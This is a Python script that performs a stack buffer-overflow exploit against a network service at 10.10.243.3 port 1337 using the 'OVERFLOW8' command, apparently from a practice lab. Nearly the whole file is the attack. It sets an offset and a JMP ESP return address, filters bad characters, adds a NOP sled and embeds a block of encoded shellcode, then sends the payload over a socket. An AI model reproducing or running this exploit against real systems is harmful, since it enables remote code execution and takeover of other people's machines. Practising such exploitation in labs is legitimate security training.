import socket, struct
host, port = '10.10.243.3',1337



command = b'OVERFLOW8 '
length = 2000
offset = 1786
new_eip = b'BBBB'
bad_chars = [
b'\x1d',
b'\x2e',
b'\xc7',
b'\xee'
]

def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x625011D3)

shellcode =  b""
shellcode += b"\xb8\xf3\xfd\xd0\x07\xdb\xc0\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc"
shellcode += b"\x03\xb0\xf3\x32\xf2\xca\xe4\x31\xfd\x32\xf5"
shellcode += b"\x55\x77\xd7\xc4\x55\xe3\x9c\x77\x66\x67\xf0"
shellcode += b"\x7b\x0d\x25\xe0\x08\x63\xe2\x07\xb8\xce\xd4"
shellcode += b"\x26\x39\x62\x24\x29\xb9\x79\x79\x89\x80\xb1"
shellcode += b"\x8c\xc8\xc5\xac\x7d\x98\x9e\xbb\xd0\x0c\xaa"
shellcode += b"\xf6\xe8\xa7\xe0\x17\x69\x54\xb0\x16\x58\xcb"
shellcode += b"\xca\x40\x7a\xea\x1f\xf9\x33\xf4\x7c\xc4\x8a"
shellcode += b"\x8f\xb7\xb2\x0c\x59\x86\x3b\xa2\xa4\x26\xce"
shellcode += b"\xba\xe1\x81\x31\xc9\x1b\xf2\xcc\xca\xd8\x88"
shellcode += b"\x0a\x5e\xfa\x2b\xd8\xf8\x26\xcd\x0d\x9e\xad"
shellcode += b"\xc1\xfa\xd4\xe9\xc5\xfd\x39\x82\xf2\x76\xbc"
shellcode += b"\x44\x73\xcc\x9b\x40\xdf\x96\x82\xd1\x85\x79"
shellcode += b"\xba\x01\x66\x25\x1e\x4a\x8b\x32\x13\x11\xc4"
shellcode += b"\xf7\x1e\xa9\x14\x90\x29\xda\x26\x3f\x82\x74"
shellcode += b"\x0b\xc8\x0c\x83\x6c\xe3\xe9\x1b\x93\x0c\x0a"
shellcode += b"\x32\x50\x58\x5a\x2c\x71\xe1\x31\xac\x7e\x34"
shellcode += b"\x95\xfc\xd0\xe7\x56\xac\x90\x57\x3f\xa6\x1e"
shellcode += b"\x87\x5f\xc9\xf4\xa0\xca\x30\x9f\xc4\x01\x0f"
shellcode += b"\x67\xb1\x17\x6f\xb4\x68\x91\x89\xd0\x7a\xf7"
shellcode += b"\x02\x4d\xe2\x52\xd8\xec\xeb\x48\xa5\x2f\x67"
shellcode += b"\x7f\x5a\xe1\x80\x0a\x48\x96\x60\x41\x32\x31"
shellcode += b"\x7e\x7f\x5a\xdd\xed\xe4\x9a\xa8\x0d\xb3\xcd"
shellcode += b"\xfd\xe0\xca\x9b\x13\x5a\x65\xb9\xe9\x3a\x4e"
shellcode += b"\x79\x36\xff\x51\x80\xbb\xbb\x75\x92\x05\x43"
shellcode += b"\x32\xc6\xd9\x12\xec\xb0\x9f\xcc\x5e\x6a\x76"
shellcode += b"\xa2\x08\xfa\x0f\x88\x8a\x7c\x10\xc5\x7c\x60"
shellcode += b"\xa1\xb0\x38\x9f\x0e\x55\xcd\xd8\x72\xc5\x32"
shellcode += b"\x33\x37\xf5\x78\x19\x1e\x9e\x24\xc8\x22\xc3"
shellcode += b"\xd6\x27\x60\xfa\x54\xcd\x19\xf9\x45\xa4\x1c"
shellcode += b"\x45\xc2\x55\x6d\xd6\xa7\x59\xc2\xd7\xed"


all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')


nop_sled = b'\x90' * 10

payload = b''.join([

command,
b'A' * offset,
jmp_esp,
nop_sled,
shellcode,
b'C' * (length - offset - len(new_eip) - len(nop_sled) - len(shellcode)),


])





with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
